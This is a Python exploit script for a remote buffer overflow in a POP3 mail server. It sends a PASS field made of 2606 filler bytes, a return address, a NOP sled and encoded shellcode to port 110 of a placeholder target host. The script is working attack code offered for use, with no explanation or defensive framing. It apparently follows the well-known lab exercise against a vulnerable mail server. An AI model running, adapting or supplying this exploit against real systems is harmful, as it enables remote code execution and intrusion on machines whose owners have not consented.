#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


shellcode =("\x27\xfc\x3f\x2f\x41\x98\x2f\x93\x98\x43\x41\xfd\x98\x41\x98"
"\x92\xda\xc8\xd9\x74\x24\xf4\xb8\xac\xf7\xb0\x98\x5b\x31\xc9"
"\xb1\x52\x83\xc3\x04\x31\x43\x13\x03\xef\xe4\x52\x6d\x13\xe2"
"\x11\x8e\xeb\xf3\x75\x06\x0e\xc2\xb5\x7c\x5b\x75\x06\xf6\x09"
"\x7a\xed\x5a\xb9\x09\x83\x72\xce\xba\x2e\xa5\xe1\x3b\x02\x95"
"\x60\xb8\x59\xca\x42\x81\x91\x1f\x83\xc6\xcc\xd2\xd1\x9f\x9b"
"\x41\xc5\x94\xd6\x59\x6e\xe6\xf7\xd9\x93\xbf\xf6\xc8\x02\xcb"
"\xa0\xca\xa5\x18\xd9\x42\xbd\x7d\xe4\x1d\x36\xb5\x92\x9f\x9e"
"\x87\x5b\x33\xdf\x27\xae\x4d\x18\x8f\x51\x38\x50\xf3\xec\x3b"
"\xa7\x89\x2a\xc9\x33\x29\xb8\x69\x9f\xcb\x6d\xef\x54\xc7\xda"
"\x7b\x32\xc4\xdd\xa8\x49\xf0\x56\x4f\x9d\x70\x2c\x74\x39\xd8"
"\xf6\x15\x18\x84\x59\x29\x7a\x67\x05\x8f\xf1\x8a\x52\xa2\x58"
"\xc3\x97\x8f\x62\x13\xb0\x98\x11\x21\x1f\x33\xbd\x09\xe8\x9d"
"\x3a\x6d\xc3\x5a\xd4\x90\xec\x9a\xfd\x56\xb8\xca\x95\x7f\xc1"
"\x80\x65\x7f\x14\x06\x35\x2f\xc7\xe7\xe5\x8f\xb7\x8f\xef\x1f"
"\xe7\xb0\x10\xca\x80\x5b\xeb\x9d\xa4\x90\xf3\x1c\xd1\xa4\xf3"
"\x9f\x9a\x20\x15\xf5\xcc\x64\x8e\x62\x74\x2d\x44\x12\x79\xfb"
"\x21\x14\xf1\x08\xd6\xdb\xf2\x65\xc4\x8c\xf2\x33\xb6\x1b\x0c"
"\xee\xde\xc0\x9f\x75\x1e\x8e\x83\x21\x49\xc7\x72\x38\x1f\xf5"
"\x2d\x92\x3d\x04\xab\xdd\x85\xd3\x08\xe3\x04\x91\x35\xc7\x16"
"\x6f\xb5\x43\x42\x3f\xe0\x1d\x3c\xf9\x5a\xec\x96\x53\x30\xa6"
"\x7e\x25\x7a\x79\xf8\x2a\x57\x0f\xe4\x9b\x0e\x56\x1b\x13\xc7"
"\x5e\x64\x49\x77\xa0\xbf\xc9\x97\x43\x15\x24\x30\xda\xfc\x85"
"\x5d\xdd\x2b\xc9\x5b\x5e\xd9\xb2\x9f\x7e\xa8\xb7\xe4\x38\x41"
"\xca\x75\xad\x65\x79\x75\xe4")


buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" *8 +  shellcode


try:
	print "\nSending evil Buffer"
	s.connect(('RHOSTS',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\ndone'
except:
	print "Could not connect to pop3"
